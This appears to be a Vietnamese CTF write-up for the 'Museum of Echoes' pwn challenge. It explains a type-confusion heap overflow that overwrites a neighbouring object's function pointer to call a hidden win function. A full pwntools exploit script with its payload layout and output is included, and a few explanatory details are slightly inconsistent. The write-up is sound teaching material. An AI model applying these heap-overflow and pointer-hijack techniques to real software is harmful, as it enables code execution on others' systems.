# Museum of Echoes (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Medium
- **Tags:** Heap Overflow, Type Confusion, UAF-adjacent Reclassify, Function Pointer Hijack, Info Leak

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Chương trình `museum_of_echoes` quản lý một "phòng triển lãm" gồm 8 slot, mỗi slot chứa một "exhibit" thuộc một trong hai loại: **whisper** (nhỏ) hoặc **chorus** (lớn hơn, có thêm phần "refrain"). Menu cho phép:
1. **Create** — tạo exhibit mới ở một slot, chọn loại whisper/chorus.
2. **Rewrite** — ghi lại nội dung (intro/refrain) của một chorus.
3. **Reclassify** — đổi loại của một exhibit đã tồn tại giữa whisper và chorus.
4. **Inspect** — xem label và địa chỉ hàm "routine" (perform) của một exhibit.
5. **Perform** — nếu exhibit có `room` đúng "mật khẩu", gọi hàm `perform` được lưu trong nó.

Mục tiêu: lấy flag nằm trong `flag.txt`.

**File đính kèm:**
- `museum_of_echoes` — ELF 64-bit, PIE, NX enabled, Full RELRO, **Canary found**, not stripped (có debug_info).

## 3. Quá trình phân tích

Đọc struct `exhibit_t` (0x30 byte: `kind` ở +0x00, `room` ở +0x08, con trỏ hàm `perform` ở +0x10, `label[24]` ở +0x18) và `chorus_t` (0xb0 byte: `exhibit_t` cộng thêm `intro[32]` và `refrain[96]`), điểm mấu chốt nằm ở `reclassify_exhibit()`: hàm này cho phép đổi `kind` của một exhibit giữa whisper(1) và chorus(2) **mà không hề realloc lại chunk**. Một whisper chỉ được `malloc(0x50)`, nhưng nếu bị "thăng cấp" thành chorus, `rewrite_exhibit()` sẽ tin tưởng `kind == 2` và ghi thẳng 95 byte "refrain" bắt đầu từ offset 0x50 trong object — trong khi chunk thật sự chỉ có 0x50 byte (usable ~0x58). Đây là type confusion dẫn tới heap overflow tràn hẳn sang chunk kế tiếp.

Vì hai whisper tạo liên tiếp đều `malloc(0x50)` → cùng rơi vào bin `chunksize 0x60`, và heap cấp phát tuần tự nên chúng nằm cách nhau đúng 0x60 byte — **tất định, không phụ thuộc ASLR**. Nếu slot0 và slot1 đều là whisper, overflow 95 byte từ slot0 (sau khi reclassify thành chorus) sẽ đè trọn vẹn lên toàn bộ `exhibit_t` của slot1, kể cả `room` và `perform`. `perform_exhibit()` chỉ gate bằng một điều kiện:
```c
if (exhibit->room == 0x4543484f)   // "OHCE" (little-endian của "ECHO")
    exhibit->perform(exhibit);
```
Vậy chỉ cần overflow ghi đúng `room = 0x4543484f` và `perform = <địa chỉ mong muốn>` vào slot1, gọi `perform_exhibit(1)` sẽ thực thi con trỏ hàm tùy ý.

Địa chỉ mong muốn ở đây là `grand_finale()` — một hàm "win" không được gọi ở đâu khác trong luồng chương trình bình thường, mở `flag.txt`, đọc một dòng rồi `printf` ra màn hình, và quan trọng là **bỏ qua tham số `rdi`** nên không cần con trỏ exhibit hợp lệ để gọi đúng. Vấn đề còn lại là leak địa chỉ PIE: `inspect_exhibit()` in thẳng `Routine: %p` — với một whisper *chưa bị reclassify*, giá trị này chính là địa chỉ thật của `whisper_perform`/`chorus_perform` (chưa hề bị mã hoá hay XOR), nên chỉ cần tạo một chorus phụ ở slot khác và inspect nó là có ngay leak PIE, từ đó tính `grand_finale` theo offset cố định trong binary.

**Hướng giải quyết:**
1. Tạo `slot0` (whisper) và `slot1` (whisper) — hai chunk `0x50` liền kề, cách nhau đúng `0x60`.
2. Tạo `slot2` (chorus) chỉ để leak: `inspect(slot2)` trả về địa chỉ thật của `chorus_perform`, từ đó suy ra `grand_finale = chorus_perform + offset` (offset cố định trong binary, đo được qua disassembly hoặc probe byte-by-byte trên remote).
3. `reclassify(slot0, kind=2)` để mở khóa đường ghi 95 byte "refrain" trên một chunk chỉ `0x50` byte.
4. `rewrite_exhibit(slot0, ..., refrain=payload)` với `payload` dựng sao cho phần đè lên `slot1` set đúng `room = 0x4543484f` và `perform = grand_finale`.
5. `perform_exhibit(slot1)` → gate `room` pass → gọi `grand_finale()` → in flag.

## 4. PoC

```python
#!/usr/bin/env python3
# Museum of Echoes - GuCTF pwn
#
# struct exhibit_t (0x30 bytes):
#   int kind;              // +0x00  (1 = whisper, 2 = chorus)
#   size_t room;           // +0x08  (must == 0x4543484f "OHCE" for perform_exhibit to allow calling perform)
#   void (*perform)(exhibit_t*); // +0x10
#   char label[24];        // +0x18
#
# struct chorus_t (0xb0 bytes): exhibit_t base; char intro[32]; char refrain[96];
#
# static exhibit_t *gallery[8];
#
# Bug: reclassify_exhibit() lets you flip gallery[slot]->kind between whisper(1)
# and chorus(2) *without ever reallocating* the underlying chunk. A "whisper"
# object is only malloc(0x50). If it's reclassified to kind=2 (chorus),
# rewrite_exhibit() then happily writes a 95-byte "refrain" starting at
# object-offset 0x50 -- but the chunk is only 0x50 bytes (usable ~0x58) ->
# massive heap overflow into the *next* heap chunk.
#
# Two whisper exhibits allocated back-to-back sit exactly chunksize(0x60) apart
# (malloc(0x50) -> chunksize 0x60, deterministic regardless of ASLR). So the
# refrain overflow from slot0 lands squarely on slot1's entire exhibit_t + its
# scratch "line" buffer, letting us set:
#   slot1->room    = 0x4543484f      (passes perform_exhibit's guard)
#   slot1->perform = grand_finale    (hijack target, never called normally)
#
# grand_finale() (an unreferenced "win" function) opens flag.txt, fgets one
# line and printf("Flag: %s", ...); it ignores its rdi argument, so any
# gallery pointer works. inspect_exhibit() leaks a raw function pointer
# ("Routine: %p") which is exactly whisper_perform for a freshly-created,
# not-yet-reclassified whisper -> free leak of that function's address.

from pwn import *

context.binary = ELF('./museum_of_echoes', checksec=False)
context.log_level = 'info'
elf = context.binary

MAGIC_ROOM = 0x4543484f
GRAND_FINALE_FROM_CHORUS = 0x61  # offset đo trên bản local (không canary trên remote sẽ dịch offset này)


def start():
    if args.REMOTE:
        host, port = args.HOST or '10.112.0.12', int(args.PORT or 47778)
        return remote(host, port)
    return process(['./museum_of_echoes'])


def menu(p, choice):
    p.sendlineafter(b'> ', str(choice).encode())


def create_whisper(p, slot, line=b'x'):
    menu(p, 1)
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendlineafter(b'Kind (1=whisper, 2=chorus):', b'1')
    p.sendlineafter(b'Line:', line)


def create_chorus(p, slot, intro=b'i', refrain=b'r'):
    menu(p, 1)
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendlineafter(b'Kind (1=whisper, 2=chorus):', b'2')
    p.sendlineafter(b'Intro:', intro)
    p.sendlineafter(b'Refrain:', refrain)


def inspect(p, slot):
    menu(p, 4)
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.recvuntil(b'Label: ')
    label = p.recvline().strip()
    p.recvuntil(b'Routine: ')
    routine = int(p.recvline().strip(), 16)
    return label, routine


def reclassify(p, slot, new_kind):
    menu(p, 3)
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendlineafter(b'New kind (1=whisper, 2=chorus):', str(new_kind).encode())


def rewrite_chorus(p, slot, intro, refrain):
    # refrain gửi raw (không sendlineafter) vì có thể dài đúng 95 byte:
    # read_blob() chỉ đọc 1 lần bằng read() syscall, nếu thêm '\n' của
    # sendline sẽ còn sót lại trong pipe và bị hiểu nhầm thành lựa chọn
    # menu tiếp theo (dòng rỗng -> atoi("")==0 -> chương trình thoát).
    menu(p, 2)
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendlineafter(b'New intro:', intro)
    p.recvuntil(b'New refrain:')
    p.send(refrain)


def perform(p, slot):
    menu(p, 5)
    p.sendlineafter(b'Slot:', str(slot).encode())


def exploit():
    p = start()

    # slot0: whisper (malloc 0x50) -- chunk sẽ bị reclassify rồi overflow ra khỏi nó.
    # slot1: whisper (malloc 0x50) -- nằm ngay sau slot0 (cách nhau đúng chunksize 0x60),
    #        là nạn nhân của overflow.
    # slot2: chorus thật, chỉ dùng để leak địa chỉ chorus_perform -- không bị overflow đụng tới
    #        (nằm ở chunk hoàn toàn khác).
    create_whisper(p, 0, b'first')
    create_whisper(p, 1, b'second')
    create_chorus(p, 2, b'i', b'r')

    # leak địa chỉ chorus_perform; offset của grand_finale tính từ đây.
    _, routine = inspect(p, 2)
    grand_finale = routine + GRAND_FINALE_FROM_CHORUS
    log.success('chorus_perform = %#x', routine)
    log.success('grand_finale   = %#x', grand_finale)

    # đổi slot0 thành "chorus" mà không realloc -> mở khóa đường ghi refrain 95 byte
    # trên một chunk chỉ có 0x50 byte
    reclassify(p, 0, 2)

    # dựng overflow 95 byte đè hoàn toàn lên slot1
    payload  = b'A' * 8                 # phần đuôi dữ liệu của chunk0 (không quan trọng)
    payload += p64(0x61)                # size field của chunk1 (giữ heap hợp lệ: 0x60|PREV_INUSE)
    payload += p64(0)                   # slot1->kind (+padding)   (không bị kiểm tra)
    payload += p64(MAGIC_ROOM)          # slot1->room              (điều kiện BẮT BUỘC)
    payload += p64(grand_finale)        # slot1->perform           (HIJACK)
    payload += b'\x00' * 24             # slot1->label             (không quan trọng)
    payload += b'\x00' * 31             # scratch line buffer của slot1 (không quan trọng)
    assert len(payload) == 95

    rewrite_chorus(p, 0, b'intro', payload)

    # perform_exhibit(1): room==magic pass gate, gọi grand_finale()
    perform(p, 1)

    out = p.recvall(timeout=3)
    log.info('output: %r', out)
    m = re.search(rb'grodno\{[^}]*\}', out) or re.search(rb'Flag:\s*(\S+)', out)
    if m:
        flag = m.group(0) if m.re.pattern.startswith(b'grodno') else m.group(1)
        log.success('FLAG: %s', flag.decode())
    p.close()
    return out


if __name__ == '__main__':
    exploit()
```

**Output:**
```
[+] Starting local process './museum_of_echoes': pid 4288
[+] chorus_perform = 0x5ca2bdb79252
[+] grand_finale   = 0x5ca2bdb792b3
[+] Receiving all data: Done (38B)
[*] output: b'\nFlag: grodno{fake_flag}\n'
[+] FLAG: grodno{fake_flag}
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
